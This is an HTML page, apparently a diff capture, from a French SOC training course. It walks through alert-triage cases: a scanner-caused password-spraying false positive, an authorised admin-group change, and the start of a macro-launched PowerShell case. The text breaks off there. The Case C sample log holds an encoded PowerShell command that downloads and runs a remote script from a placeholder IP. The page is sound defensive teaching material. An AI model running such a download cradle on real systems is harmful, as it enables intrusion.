+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Traffic Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../07-ids-ips/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IDS / IPS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../08-malware-analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Malware Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../09-forensics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Forensics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../10-incident-handling/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Incident Handling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../mad/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MITRE ATT&CK Defender
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    MITRE ATT&CK Defender
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mad/fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ATT&CK Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mad/cti/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cyber Threat Intelligence
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mad/soc-assessments/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SOC Assessments
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mad/hunting-detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Threat Hunting & Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mad/adversary-emulation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Adversary Emulation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../mad/tactics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tactiques ATT&CK
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../hunting/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Threat Hunting
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Threat Hunting
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../hunting/methodology/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Méthodologie
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../hunting/hypotheses/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Playbook de hypothèses
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../detection-engineering/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Detection Engineering
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_6" id="__nav_6_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Detection Engineering
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../detection-engineering/sigma/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Sigma
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../detection-engineering/lifecycle/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cycle de vie d'une détection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../detection-engineering/testing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tests (Atomic Red Team)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../cheatsheets/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cheatsheets
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_7" id="__nav_7_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Cheatsheets
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/splunk-spl/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Splunk SPL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/elastic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Elastic KQL / EQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/windows-event-ids/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Event IDs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/sysmon/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Sysmon Event IDs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/network/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Réseau (Zeek / tshark / Suricata)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/forensics-malware/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Forensics & Malware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../labs/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Labs
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_8" id="__nav_8_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Labs
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../labs/home-lab/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home lab SOC
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../labs/journal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Journal de labs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../resources/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ressources
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_9" id="__nav_9_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Ressources
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../resources/glossary/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Glossaire
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../resources/templates/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Templates
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table des matières">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table des matières
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#cas-a-password-spraying-declenche-a-0200" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cas A : « Password spraying » déclenché à 02:00
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Cas A : « Password spraying » déclenché à 02:00">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lalerte" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        L'alerte
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#donnees" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Données
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#indices-a-relever" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Indices à relever
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cas-b-ajout-au-groupe-administrateurs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cas B : Ajout au groupe Administrateurs
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Cas B : Ajout au groupe Administrateurs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lalerte_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        L'alerte
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#questions-a-te-poser" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Questions à te poser
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#donnees_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Données
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cas-c-document-office-qui-lance-powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cas C : Document Office qui lance PowerShell
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Cas C : Document Office qui lance PowerShell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lalerte_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        L'alerte
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-1-levenement" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 1 : l'événement
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-2-decoder" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 2 : décoder
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etape-3-pivoter" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Étape 3 : pivoter
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cas-d-lalerte-qui-naurait-jamais-du-etre-silencieuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cas D : l'alerte qui n'aurait jamais dû être silencieuse
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Cas D : l&#39;alerte qui n&#39;aurait jamais dû être silencieuse">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lalerte_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        L'alerte
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#contexte" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Contexte
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#a-verifier" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        À vérifier
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recapitulatif" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Récapitulatif
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#erreurs-frequentes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Erreurs fréquentes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#a-retenir" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        À retenir
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <span class="md-tag">cases</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">cdsa</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">investigation</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">triage</span>
+      
+    
+  </nav>
+
+
+  
+  
+
+
+<h1 id="8-cas-travailles">8. Cas travaillés<a class="headerlink" href="#8-cas-travailles" title="Permanent link">&para;</a></h1>
+<p>Quatre alertes, quatre issues différentes. Pour chacune, <strong>essaie de conclure toi-même</strong> avant de déplier la solution. Tous les noms, IP et dates sont fictifs.</p>
+<table>
+<thead>
+<tr>
+<th>Cas</th>
+<th>Issue attendue</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>A</td>
+<td>Faux positif</td>
+</tr>
+<tr>
+<td>B</td>
+<td>Vrai positif bénin</td>
+</tr>
+<tr>
+<td>C</td>
+<td>Intrusion confirmée</td>
+</tr>
+<tr>
+<td>D</td>
+<td>Angle mort de visibilité</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="cas-a-password-spraying-declenche-a-0200">Cas A : « Password spraying » déclenché à 02:00<a class="headerlink" href="#cas-a-password-spraying-declenche-a-0200" title="Permanent link">&para;</a></h2>
+<h3 id="lalerte">L'alerte<a class="headerlink" href="#lalerte" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p><strong>Règle</strong> : ≥ 10 comptes distincts en échec depuis une même IP en 5 min · <strong>IP</strong> : <code>10.0.9.15</code> · <strong>Heure</strong> : mardi 02:00 UTC · <strong>Cibles</strong> : 40 serveurs</p>
+</blockquote>
+<h3 id="donnees">Données<a class="headerlink" href="#donnees" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>index=wineventlog EventCode=4625 src_ip="10.0.9.15"
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>| stats count, dc(user) as users, dc(host) as hosts, values(SubStatus) as substatus by src_ip
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>count</th>
+<th>users</th>
+<th>hosts</th>
+<th>substatus</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>412</td>
+<td>3</td>
+<td>40</td>
+<td>0xc000006a</td>
+</tr>
+</tbody>
+</table>
+<h3 id="indices-a-relever">Indices à relever<a class="headerlink" href="#indices-a-relever" title="Permanent link">&para;</a></h3>
+<ul>
+<li>IP <strong>interne</strong>, la même <strong>chaque mardi à 02:00</strong> (vérifie l'historique).</li>
+<li>Seulement <strong>3 comptes</strong>, tous des comptes de <strong>service</strong>, sur <strong>40 hôtes</strong> : c'est un balayage de machines, pas de comptes.</li>
+<li>Toujours <code>0xC000006A</code> (bon compte, mauvais mot de passe).</li>
+</ul>
+<details class="success">
+<summary>Solution</summary>
+<p>L'IP <code>10.0.9.15</code> est l'inventaire du <strong>scanner de vulnérabilités</strong>, qui tourne chaque mardi. Il se connecte avec des identifiants dont <strong>le mot de passe a changé</strong> depuis la dernière rotation, d'où les échecs.</p>
+<p><strong>Classification</strong> : faux positif (règle correcte, mais cause <strong>opérationnelle</strong> à corriger).</p>
+<p><strong>Actions</strong> :
+1. Faire corriger le mot de passe du compte de scan (le vrai problème).
+2. <strong>Exclure précisément</strong> <code>10.0.9.15</code> pour cette règle, avec propriétaire et date de revue.
+3. Garder une alerte si ce scanner <strong>réussit</strong> soudain depuis un autre hôte ou à une autre heure.</p>
+<p><strong>Leçon</strong> : un faux positif récurrent indique souvent un <strong>dysfonctionnement réel</strong> à corriger, pas seulement du bruit à masquer.</p>
+</details>
+<hr />
+<h2 id="cas-b-ajout-au-groupe-administrateurs">Cas B : Ajout au groupe Administrateurs<a class="headerlink" href="#cas-b-ajout-au-groupe-administrateurs" title="Permanent link">&para;</a></h2>
+<h3 id="lalerte_1">L'alerte<a class="headerlink" href="#lalerte_1" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p><strong>Règle</strong> : événement 4732 (membre ajouté à un groupe local de sécurité) pour <code>Administrators</code> · <strong>Hôte</strong> : <code>SRV-APP07</code> · <strong>Compte ajouté</strong> : <code>svc_deploy</code> · <strong>Acteur</strong> : <code>adm_lopez</code></p>
+</blockquote>
+<h3 id="questions-a-te-poser">Questions à te poser<a class="headerlink" href="#questions-a-te-poser" title="Permanent link">&para;</a></h3>
+<ol>
+<li>Qui est <code>adm_lopez</code> ? Est-ce un administrateur légitime ?</li>
+<li>Y a-t-il un <strong>ticket de changement</strong> correspondant ?</li>
+<li>L'heure est-elle cohérente avec une opération de maintenance ?</li>
+<li>D'où <code>adm_lopez</code> s'est-il connecté (poste habituel ou source inhabituelle) ?</li>
+</ol>
+<h3 id="donnees_1">Données<a class="headerlink" href="#donnees_1" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>index=wineventlog host="SRV-APP07" earliest=-2h
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>  (EventCode=4624 OR EventCode=4732 OR EventCode=4672)
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>| table _time, EventCode, user, src_ip, Logon_Type, Group_Name
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>| sort _time
+</code></pre></div>
+<details class="success">
+<summary>Solution</summary>
+<ul>
+<li><code>adm_lopez</code> est administrateur système, connecté en RDP depuis son <strong>poste habituel</strong> (IP connue) à 14:05.</li>
+<li>Un ticket de changement <strong>CHG-2041</strong> couvre « déploiement applicatif sur SRV-APP07 » entre 14:00 et 16:00.</li>
+<li>L'ajout de <code>svc_deploy</code> correspond au déploiement.</li>
+</ul>
+<p><strong>Classification</strong> : vrai positif <strong>bénin</strong> : la règle a bien détecté un ajout privilégié, mais il est <strong>autorisé</strong>.</p>
+<p><strong>Actions</strong> : clôturer avec la référence du ticket ; <strong>ne pas exclure la règle</strong>. Proposer d'<strong>enrichir</strong> avec la liste des tickets de changement pour résoudre automatiquement ce cas à l'avenir. Vérifier que <code>svc_deploy</code> est <strong>retiré du groupe</strong> après le déploiement (c'est un suivi de bonne hygiène).</p>
+<p><strong>Leçon</strong> : « autorisé » se <strong>prouve</strong> (ticket, acteur, heure, source). Sans preuve, c'est un vrai positif jusqu'à preuve du contraire.</p>
+</details>
+<hr />
+<h2 id="cas-c-document-office-qui-lance-powershell">Cas C : Document Office qui lance PowerShell<a class="headerlink" href="#cas-c-document-office-qui-lance-powershell" title="Permanent link">&para;</a></h2>
+<h3 id="lalerte_2">L'alerte<a class="headerlink" href="#lalerte_2" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p><strong>Règle</strong> : processus <code>winword.exe</code> créant <code>powershell.exe</code> · <strong>Hôte</strong> : <code>WS-0231</code> · <strong>Utilisateur</strong> : <code>CORP\mdupont</code> · <strong>Heure</strong> : 10:42 UTC</p>
+</blockquote>
+<h3 id="etape-1-levenement">Étape 1 : l'événement<a class="headerlink" href="#etape-1-levenement" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">{</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">  </span><span class="nt">"@timestamp"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2026-03-14T10:42:11.208Z"</span><span class="p">,</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">  </span><span class="nt">"event"</span><span class="p">:</span><span class="w">   </span><span class="p">{</span><span class="w"> </span><span class="nt">"code"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1"</span><span class="w"> </span><span class="p">},</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">  </span><span class="nt">"host"</span><span class="p">:</span><span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"WS-0231"</span><span class="w"> </span><span class="p">},</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">  </span><span class="nt">"user"</span><span class="p">:</span><span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"mdupont"</span><span class="p">,</span><span class="w"> </span><span class="nt">"domain"</span><span class="p">:</span><span class="w"> </span><span class="s2">"CORP"</span><span class="w"> </span><span class="p">},</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">  </span><span class="nt">"process"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">    </span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"powershell.exe"</span><span class="p">,</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">    </span><span class="nt">"command_line"</span><span class="p">:</span><span class="w"> </span><span class="s2">"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADUALwBhAC4AcABzADEAJwApAA=="</span><span class="p">,</span>
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">    </span><span class="nt">"parent"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"winword.exe"</span><span class="p">,</span><span class="w"> </span><span class="nt">"command_line"</span><span class="p">:</span><span class="w"> </span><span class="s2">"\"WINWORD.EXE\" \"C:\\Users\\mdupont\\Downloads\\Facture_0314.docm\""</span><span class="w"> </span><span class="p">}</span>
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="w">  </span><span class="p">}</span>
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="p">}</span>
+</code></pre></div>
